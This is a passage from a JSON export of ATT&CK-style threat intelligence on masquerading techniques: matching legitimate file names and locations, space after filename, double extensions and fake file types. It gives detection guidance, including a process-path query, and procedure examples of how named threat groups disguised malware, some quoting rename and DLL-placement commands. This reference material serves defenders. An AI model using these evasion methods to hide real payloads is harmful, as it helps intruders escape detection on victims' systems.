      "SysUpdatehas named their unit configuration file similarly to other unit files residing in the same directory,/usr/lib/systemd/system/, to appear benign.[82]",
      "Tarraskcreates a scheduled task called \"WinUpdate\" to re-establish any dropped  C2 connections.[83]",
      "TinyTurlahas mimicked an existing Windows service by being installed asWindows Time Service.[84]",
      "To establish persistence,Truvasysadds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.[85]",
      "Turiancan disguise as a legitimate service to blend into normal operations.[12]",
      "Uroburoshas registered a service namedWerFaultSvc, likely to spoof the legitimate Windows error reporting service.[86]",
      "SomeVolgmervariants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.[87][88]",
      "Winter Vivernhas distributed malicious scripts and executables mimicking virus scanners.[89]",
      "Wizard Spiderhas used scheduled tasks to installTrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf.[90]It has also used common document file names for other malware binaries.[91]",
      "ZIRCONIUMhas created a run key namedDropbox Update Setupto mask a persistence mechanism for a malicious binary.[92]",
      "ZxxZhas been disguised as a Windows security update service.[14]"
    ]
  },
  "T1036.005": {
    "Name": "Masquerading:Match Legitimate Resource Name or Location",
    "Description": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex:svchost.exe). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.[1]",
    "Detects": [
      "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.",
      "In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.[217]Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
      "Monitor for newly executed processes that may match or approximate the name or location of legitimate files or resources when naming/placing them. Looks for mismatches between process names and their image paths.Malware authors often use this technique to hide malicious executables behind legitimate Windows executable names (e.g.lsass.exe,svchost.exe, etc).There are several sub-techniques, but this analytic focuses onMatch Legitimate Resource Name or Locationonly.Note: With process monitoring, hunt for processes matching these criteria:process name issvchost.exe,smss.exe,wininit.exe,taskhost.exe, etc.process path is notC:\\Windows\\System32\\orC:\\Windows\\SysWow64\\Examples (true positive):C:\\Users\\administrator\\svchost.exeTo make sure the rule doesn’t miss cases where the executable would be started from a sub-folder of these locations, the entire path is checked for the process path. The below example should be considered as suspicious:C:\\Windows\\System32\\srv\\svchost.exeAnalytic 1 - Common Windows Process Masquerading(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")AND ( (Image=svchost.exe AND (image_path!=\"C:\\Windows\\System32\\svchost.exe\" OR process_path!=\"C:\\Windows\\SysWow64\\svchost.exe\"))  OR (Image=\"*smss.exe\" AND image_path!=\"C:\\Windows\\System32\\smss.exe\")  OR (Image=\"wininit.exe\" AND image_path!=\"C:\\Windows\\System32\\wininit.exe\")  OR (Image=\"taskhost.exe\" AND image_path!=\"C:\\Windows\\System32\\taskhost.exe\")  OR (Image=\"lasass.exe\" AND image_path!=\"C:\\Windows\\System32\\lsass.exe\")  OR (Image=\"winlogon.exe\" AND image_path!=\"C:\\Windows\\System32\\winlogon.exe\")  OR (Image=\"csrss.exe\" AND image_path!=\"C:\\Windows\\System32\\csrss.exe\")  OR (Image=\"services.exe\" AND image_path!=\"C:\\Windows\\System32\\services.exe\")  OR (Image=\"lsm.exe\" AND image_path!=\"C:\\Windows\\System32\\lsm.exe\")  OR (Image=\"explorer.exe\" AND image_path!=\"C:\\Windows\\explorer.exe\")",
      "Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.[2]",
      "admin@338actors used the following command to rename one of their tools to a benign file name:ren \"%temp%\\upload\" audiodg.exe[3]",
      "Akirahas used legitimate names and locations for files to evade defenses.[4]",
      "ANDROMEDAhas been installed toC:\\Temp\\TrustedInstaller.exeto mimic a legitimate Windows installer service.[5]",
      "AppleSeedhas the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.[6]",
      "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used byAPT1as a name for malware.[7][8]",
      "APT28has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.[9]",
      "APT29has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.[10][11]",
      "APT32has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update.APT32has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.[12][13]",
      "APT39has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.[14][15]",
      "APT41attempted to masquerade their files as popular anti-virus software.[16][17]",
      "APT42has masqueraded the VINETHORN payload as a VPN application.[18]",
      "APT5has named exfiltration archives to mimic Windows Updates at times using filenames with aKB<digits>.zippattern.[19]",
      "Aquatic Pandarenamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments.[20]",
      "BackConfighas hidden malicious payloads in%USERPROFILE%\\Adobe\\Driver\\dwg\\and mimicked the legitimate DHCP service binary.[21]",
      "BackdoorDiplomacyhas dropped implants in folders named for legitimate software.[22]",
      "Bad Rabbithas masqueraded as a Flash Player installer through the executable fileinstall_flash_player.exe.[23][24]",
      "BADNEWSattempts to hide its payloads using legitimate filenames.[25]",
      "TheBazarloader has named malicious shortcuts \"adobe\" and mimicked communications software.[26][27][28]",
      "Bisonalhas renamed malicious code tomsacm32.dllto hide within a legitimate library; earlier versions were disguised aswinhelp.[29]",
      "TheBlack Bastadropper has mimicked an application for creating USB bootable drivers.[30]",
      "BLINDINGCANhas attempted to hide its payload by using legitimate file names such as \"iconcache.db\".[31]",
      "Blue Mockingbirdhas masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.[32]",
      "BRONZE BUTLERhas given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.[33]",
      "Brute Ratel C4has used a payload file named OneDrive.update to appear benign.[34]",
      "Bumblebeehas named component DLLs \"RapportGP.dll\" to match those used by the security company Trusteer.[35]",
      "Bundlorehas disguised a malicious .app file as a Flash Player update.[36]",
      "DuringC0017,APT41used file names beginning with USERS, SYSUSER, and SYSLOG forDEADEYE, and changedKEYPLUGfile extensions from .vmp  to .upx likely to avoid hunting detections.[37]",
      "ForC0018, the threat actors renamed aSliverpayload tovmware_kb.exe.[38]",
      "During theC0032campaign,TEMP.Velesrenamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.[39]",
      "Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.[40]",
      "Carbanakhas named malware \"svchost.exe,\" which is the name of the Windows shared service host program.[41]",
      "Carberphas masqueraded as Windows system file names, as well as \"chkntfs.exe\" and \"syscron.exe\".[42][43]",
      "Chaeshas used an unsigned, crafted DLL module namedhha.dllthat was designed to look like a legitimate 32-bit Windows DLL.[44]",
      "ChChescopies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).[45]",
      "Chimerahas renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.[46]",
      "Chinoxyhas used the nameeoffice.exein attempt to appear as a legitimate file.[47]",
      "Cubahas been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs.[48]",
      "Cuckoo Stealerhas copied and renamed itself to DumpMediaSpotifyMusicConverter.[49][50]",
      "Cyclops Blinkcan rename its running process to[kworker:0/1]to masquerade as a Linux kernel thread.Cyclops Blinkhas also named RC scripts used for persistence after WatchGuard artifacts.[51]",
      "DanBotfiles have been namedUltraVNC.exeandWINVNC.exeto appear as legitimate VNC tools.[52]",
      "DarkComethas dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.[53]",
      "Darkhotelhas used malware that is disguised as a Secure Shell (SSH) tool.[54]",
      "Daserfuses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.[55]",
      "Dokihas disguised a file as a Linux kernel module.[56]",
      "DRATzarushas been namedFlash.exe, and its dropper has been namedIExplorer.[57]",
      "One ofDtrackcan hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.[58]",
      "DUSTPANis often disguised as a legitimate Windows binary such asw3wp.exeorconn.exe.[59]",
      "Earth Luscaused the commandmove [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dllto move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.[60]",
      "EKANShas been disguised asupdate.exeto appear as a valid executable.[61]",
      "If installing itself as a service fails,Eliseinstead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.[62]",
      "Ember Bearhas renamed tools to match legitimate utilities, such as renaming GOST tunneling instances tojavain victim environments.[63]",
      "Felismushas masqueraded as legitimate Adobe Content Management System files.[64]",
      "Ferocious Kittenhas named malicious filesupdate.exeand loaded them into the compromise host's \"Public\" folder.[65]",
      "FIN13has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.[66]",
      "FIN7has attempted to run Darkside ransomware with the filename sleep.exe.[67]",
      "FinFisherrenames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.[68][69]",
      "FoggyWebcan be disguised as a Visual Studio file such asWindows.Data.TimeZones.zh-PH.prito evade detection. Also,FoggyWeb's loader can mimic a genuinedllfile that carries out the same import functions as the legitimate Windowsversion.dllfile.[70]",
      "Fox Kittenhas named binaries and configuration files svhost and dllhost respectively to appear legitimate.[71]",
      "Fysbishas masqueraded as trusted software rsyncd and dbus-inotifier.[72]",
      "Gamaredon Grouphas used legitimate process names to hide malware includingsvchosst.[73]",
      "Gelsemiumhas named malicious binariesserv.exe,winprint.dll, andchrome_elf.dlland has set its persistence in the Registry with the key valueChrome Updateto appear legitimate.[74]",
      "GoBearis installed through droppers masquerading as legitimate, signed software installers.[75]",
      "GoldenSpy's setup file installs initial executables under the folder%WinDir%\\System32\\PluginManager.[76]",
      "GoldMaxhas used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.[77][78]",
      "Goopyhas impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.[12]",
      "Grandoreirohas named malicious browser extensions and update files to appear legitimate.[79][80]",
      "Green Lamberthas been disguised as a Growl help file.[81][82]",
      "HermeticWiperhas used the namepostgressql.exeto mask a malicious payload.[83]",
      "HermeticWizardhas been namedexec_32.dllto mimic a legitimate MS Outlook .dll.[83]",
      "DuringHomeLand Justice, threat actors renamedROADSWEEPto GoXML.exe andZeroCleareto cl.exe.[84][85]",
      "HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.[86]",
      "IceApple.NET assemblies have usedApp_Web_in their file names to appear legitimate.[87]",
      "IcedIDhas modified legitimate .dll files to include malicious code.[88]",
      "INC Ransomhas named aPsExecexecutable winupd to mimic a legitimate Windows update file.[89][90]",
      "Indrik Spiderused fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.[91]",
      "InnaputRATvariants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.[92]",
      "InvisiMolehas disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.[93][94]",
      "Ixeshehas used registry values and file names associated with Adobe software, such as AcroRd32.exe.[95]",
      "J-magiccan rename itself as \"[nfsiod 0]\" to masquerade as the local Network File System (NFS) asynchronous I/O server.[96]",
      "During theJ-magic Campaign, threat actors used the name \"JunoscriptService\" to masquerade malware as the Junos automation scripting service.[96]",
      "Ke3changhas dropped their malware into legitimate installed software paths including:C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe,C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe,C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe, andC:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe.[97]",
      "KGH_SPYhas masqueraded as a legitimate Windows tool.[98]",
      "Kimsukyhas renamed malware to legitimate names such asESTCommon.dllorpatch.dll.[99]",
      "KOCTOPUShas been disguised as legitimate software programs associated with the travel and airline industries.[100]",
      "KONNIhas created a shortcut called \"Anti virus service.lnk\" in an apparent attempt to masquerade as a legitimate file.[101]",
      "Latrodectushas been packed to appear as a component to Bitdefender’s kernel-mode driver, TRUFOS.SYS.[102]",
      "Lazarus Grouphas renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.[103][104]",
      "LightNeuronhas used filenames associated with Exchange and Outlook for binary and configuration files, such aswinmail.dat.[105]",
      "LookBackhas a C2 proxy tool that masquerades asGUP.exe, which is software used by Notepad++.[106]",
      "LuminousMothhas disguised their exfiltration malware asZoomVideoApp.exe.[107]",
      "Macheterenamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.[108][109]",
      "Machete'sMacheteMSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.[110]",
      "Magic Houndhas useddllhost.exeto mask Fast Reverse Proxy (FRP) andMicrosoftOutLookUpdater.exefor Plink.[111][112][113]",
      "MagicRATstores configuration data in files and file paths mimicking legitimate operating system resources.[114]",
      "MarkiRATcan masquerade asupdate.exeandsvehost.exe; it has also mimicked legitimate Telegram and Chrome files.[65]",
      "MCMDhas been named Readme.txt to appear legitimate.[115]",
      "MechaFlounderhas been downloaded as a file named lsass.exe, which matches the legitimate Windows file.[116]",
      "menuPasshas been seen changing malicious files to appear legitimate.[117]",
      "Metamorfohas disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example.[118][119]",
      "Mis-Typesaves itself as a file namedmsdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[120][121]",
      "Misdatsaves itself as a file namedmsdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[120][121]",
      "MuddyWaterhas disguised malicious executables and used filenames and Registry key names associated with Windows Defender.[122][123][124]",
      "Mustang Pandahas used names likeadobeupdate.datandPotPlayerDB.datto disguisePlugX, and a file namedOneDrive.exeto load aCobalt Strikepayload.[125]",
      "Mustard Tempesthas used the filenameAutoUpdater.jsto mimic legitimate update files and has also used the Cyrillic homoglyph characters С(0xd0a1)and а(0xd0b0), to produce the filenameСhrome.Updаte.zip.[126][127]",
      "Naikonhas disguised malicious programs as Google Chrome, Adobe, and VMware executables.[128]",
      "Nebulaeuses functions namedStartUserModeBrowserInjectionandStopUserModeBrowserInjectionindicating that it's trying to imitate chrome_frame_helper.dll.[128]",
      "NETWIREhas masqueraded as legitimate software including TeamViewer and macOS Finder.[129]",
      "NightClubhas chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.[130]",
      "Ninjahas used legitimate looking filenames for its loader including update.dll and x64.dll.[131]",
      "NOKKIis written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.[132]",
      "Octopushas been disguised as legitimate programs, such as Java and Telegram Messenger.[133][134]",
      "OilRighas named a downloaded copy of the Plink tunneling utility as \\ProgramData\\Adobe.exe.[135]",
      "OLDBAITinstalls itself in%ALLUSERPROFILE%\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\"[136]",
      "DuringOperation CuckooBees, the threat actors renamed a malicious executable torundll32.exeto allow it to blend in with other Windows system files.[137]",
      "DuringOperation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.[138]",
      "DuringOperation Sharpshooter, threat actors installedRising Sunin the Startup folder and disguised it asmssync.exe.[139]",
      "DuringOperation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs.[140]",
      "OSX/Shlayercan masquerade as a Flash Player update.[141][142]",
      "OutSteelattempts to download and executeSaint Botto a statically-defined location attempting to mimic svchost:%TEMP%\\svjhost.exe.[143]",
      "OwaAuthuses the filename owaauth.dll, which is a legitimate file that normally resides in%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.[144]",
      "Patchworkinstalled its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as \"Net Monitor.\"[145]They have also droppedQuasarRATbinaries as files named microsoft_network.exe and crome.exe.[146]",
      "PcSharehas been namedwuauclt.exeto appear as the legitimate Windows Update AutoUpdate Client.[47]",
      "Penquinhas mimicked the Cron binary to hide itself on compromised systems.[147]",
      "PipeMonmodules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.[148]",
      "PlugXhas been disguised as legitimate Adobe and PotPlayer files.[149]",
      "Poseidon Grouptools attempt to spoof anti-virus processes as a means of self-defense.[150]",
      "PowGoophas used a DLL named Goopdate.dll to impersonate a legitimate Google update file.[151]",
      "PROMETHIUMhas disguised malicious installer files by bundling them with legitimate software installers.[152][153]",
      "PUNCHBUGGYmimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.[154][155]",
      "PyDCrypthas droppedDCSrvunder thesvchost.exename to disk.[156]",
      "Pysahas executed a malicious executable by naming it svchost.exe.[157]",
      "QUADAGENTused the PowerShell filenamesOffice365DCOMCheck.ps1andSystemDiskClean.ps1.[158]",
      "QUIETEXIThas attempted to change its name tocronupon startup. During incident response,QUIETEXITsamples have been identified that were renamed to blend in with other legitimate files.[159]",
      "Raindropwas installed under names that resembled legitimate Windows file and directory names.[160][161]",
      "RainyDayhas used names to mimic legitimate software including \"vmtoolsd.exe\" to spoof Vmtools.[128]",
      "Ramsayhas masqueraded as a 7zip installer.[162][163]",
      "RDAThas masqueraded as VMware.exe.[164]",
      "RedCurlmimicked legitimate file names and scheduled tasks, e.g.MicrosoftCurrentupdatesCheckandMdMMaintenenceTaskto mask malicious files and scheduled tasks.[165][166]",
      "TheRemsecloader implements itself with the name Security Support Provider, a legitimate Windows function. VariousRemsec.exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.Remsecalso disguised malicious modules using similar filenames as custom network encryption software on victims.[167][168]",
      "REvilcan mimic the names of known executables.[169]",
      "Rockehas used shell scripts which download mining executables and saves them with the filename \"java\".[170]",
      "RotaJakirohas used the filenamesystemd-daemonin an attempt to appear legitimate.[171]",
      "Ryukhas constructed legitimate appearing installation folder paths by callingGetWindowsDirectoryWand then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear asC:\\Users\\Public.[172]",
      "S-Typemay save itself as a file namedmsdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.[120][121]",
      "Saint Bothas been disguised as a legitimate executable, including as Windows SDK.[173]",
      "Samuraihas created the directory%COMMONPROGRAMFILES%\\Microsoft Shared\\wmi\\to contain DLLs for loading successive stages.[174]",
      "Sandworm Teamhas avoided detection by naming a malicious binary explorer.exe.[175][176]",
      "Sharkbinaries have been namedaudioddg.pdbandWinlangdb.pdbin order to appear legitimate.[52]",
      "ShimRatReporterspoofed itself asAlphaZawgyl_font.exe, a specialized Unicode font.[177]",
      "Sibothas downloaded a DLL to theC:\\windows\\system32\\drivers\\folder and renamed it with a.sysextension.[77]",
      "SideCopyhas used a legitimate DLL file name,Duser.dllto disguise a malicious remote access tool.[178]",
      "Sidewinderhas named malicious filesrekeywiz.exeto match the name of a legitimate Windows executable.[179]",
      "Silencehas named its backdoor \"WINWORD.exe\".[180]",
      "Skidmaphas created a fakermbinary to replace the legitimate Linux binary.[181]",
      "SLOTHFULMEDIAhas mimicked the names of known executables, such as mediaplayer.exe.[182]",
      "Small Sievecan use variations of Microsoft and Outlook spellings, such as \"Microsift\", in its file names to avoid detection.[183]",
      "SocGholishhas been namedAutoUpdater.jsto mimic legitimate update files.[127]",
      "During theSolarWinds Compromise,APT29renamed software and DLLs with legitimate names to appear benign.[184][185]",
      "Sowbugnamed its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directoryCSIDL_APPDATA\\microsoft\\security.[186]",
      "To establish persistence,SslMMidentifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[187]",
      "Starloaderhas masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.[186]",
      "Storm-1811has disguisedCobalt Strikeinstallers as a malicious DLL masquerading as part of a legitimate 7zip installation package.[188]",
      "StrelaStealerpayloads have tailored filenames to include names identical to the name of the targeted organization or company.[189]",
      "StrifeWaterhas been namedcalc.exeto appear as a legitimate calculator program.[190]",
      "StrongPityhas been bundled with legitimate software installation files for disguise.[152]",
      "SUGARDUMPhas been namedCrashReporter.exeto appear as a legitimate Mozilla executable.[191]",
      "SUNBURSTcreated VBScripts that were named after existing services or folders to blend into legitimate activities.[161]",
      "SUNSPOTwas identified on disk with a filename oftaskhostsvc.exeand it created an encrypted log file atC:\\Windows\\Temp\\vmware-vmdmp.log.[192]",
      "SUPERNOVAhas masqueraded as a legitimate SolarWinds DLL.[193][194]",
      "TA2541has used file names to mimic legitimate Windows files or system functionality.[195]",
      "TheTAINTEDSCRIBEmain executable has disguised itself as Microsoft’s Narrator.[103]",
      "Tarraskhas masqueraded as executable files such aswinupdate.exe,date.exe, orwin.exe.[196]",
      "TeamTNThas replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.[197]",
      "TEARDROPfiles had names that resembled legitimate Window file and directory names.[198][161]",
      "ThiefQuestprepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.[199][200]",
      "ThreatNeedlechooses its payload creation path from a randomly selected service name from netsvc.[201]",
      "TinyTurlahas been deployed asw64time.dllto appear legitimate.[202]",
      "ToddyCathas used the namedebug.exefor malware components.[174]",
      "TRANSLATEXThas been namedGoogleTranslate.crxto masquerade as a legitimate Chrome extension.[203]",
      "Transparent Tribecan mimic legitimate Windows directories by using the same icons and names.[204]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesrenamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.",
      "Troll Stealeris typically installed via a dropper file that masquerades as a legitimate security program installation file.[205][75]",
      "Tropic Trooperhas hidden payloads in Flash directories and fake installer files.[206]",
      "Turlahas named components ofLunarWebto mimic Zabbix agent logs.[207]",
      "Ursnifhas used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.[208]",
      "USBStealermimics a legitimate Russian program called USB Disk Security.[209]",
      "Velvet Antused a malicious DLL,iviewers.dll, that mimics the legitimate \"OLE/COM Object Viewer\" within Windows.[210]",
      "Volt Typhoonhas used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.[211][212][213]",
      "Whiteflyhas named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.[214]",
      "AWinnti for Windowsimplant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.[215]",
      "WIRTEhas named a first stage dropperKaspersky Update Agentin order to appear legitimate.[216]",
      "ZLibmimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.[120]"
    ]
  },
  "T1036.006": {
    "Name": "Masquerading:Space after Filename",
    "Description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file calledevil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed toevil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed toevil.txt(note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed[1].Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
    "Detects": [
      "Monitor for spaces at the end of file names, that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious."
    ],
    "Procedure Examples": [
      "APT38has put several spaces before a file extension to avoid detection and suspicion.[2]",
      "Keydnapputs a space after a false .jpg extension so that execution actually goes through the Terminal.app program.[3]"
    ]
  },
  "T1036.007": {
    "Name": "Masquerading:Double File Extension",
    "Description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:File.txt.exemay render in some views as justFile.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.[1][2]Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gainInitial Accessinto a user’s system viaSpearphishing AttachmentthenUser Execution. For example, an executable file attachment namedEvil.txt.exemay display asEvil.txtto a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.[2]Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
    "Detects": [
      "Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc."
    ],
    "Procedure Examples": [
      "TheBazarloader has used dual-extension executable files such as PreviewReport.DOC.exe.[3]",
      "DarkGatemasquerades malicious LNK files as PDF objects using the double extension.pdf.lnk.[4]",
      "Milanhas used an executable namedcompanycatalog.exe.configto appear benign.[5]",
      "Mustang Pandahas used an additional filename extension to hide the true file type.[6][7]"
    ]
  },
  "T1036.008": {
    "Name": "Masquerading:Masquerade File Type",
    "Description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is0xFF 0xD8and the file extension is either.JPE,.JPEGor.JPG.Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g.,Ingress Tool Transfer) and stored (e.g.,Upload Malware) so that adversaries may move their malware without triggering detections.Common non-executable file types and extensions, such as text files (.txt) and image files (.jpg,.gif, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name oftest.gif. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.[1]",
    "Detects": [
      "Monitor for abnormal command execution from otherwise non-executable file types (such as.txtand.jpg).",
      "Check and ensure that file headers/signature and extensions match using magic bytes detection and/or file signature validation.[21]In Linux, thefilecommand may be used to check the file signature.[22]"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teammasqueraded executables as.txtfiles.[2]",
      "ANDROMEDAhas been delivered through a LNK file disguised as a folder.[3]",
      "AvosLockerhas been disguised as a .jpg file.[4]",
      "BlackBytemasqueraded configuration files containing encryption keys as PNG files.[5]",
      "Brute Ratel C4has used Microsoft Word icons to hide malicious LNK files.[6]",
      "Kapekamasquerades as a Microsoft Word Add-In file, with the extension.wll, but is a malicious DLL file.[7][8]",
      "Lumma Stealerhas used payloads that resemble benign file extensions such as .mp3, .accdb, and .pub, though the files contained malicious JavaScript content.[9]",
      "MagicRATcan download additional executable payloads that masquerade as GIF files.[10]",
      "DuringOperation Dream Job,Lazarus Groupdisguised malicious template files as JPEG files to avoid detection.[11][12]",
      "OSX_OCEANLOTUS.Dhas disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.[13]",
      "TheQakBotpayload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.[14][15]",
      "Raspberry Robinhas historically been delivered via infected USB drives containing a malicious LNK object masquerading as a legitimate folder.[16]",
      "StrelaStealerhas been distributed as a DLL/HTML polyglot file.[17][18]",
      "Volt Typhoonhas appended copies of the ntds.dit database with a .gif file extension.[19]"
    ]
  },
  "T1036.009": {
    "Name": "Masquerading:Break Process Trees",
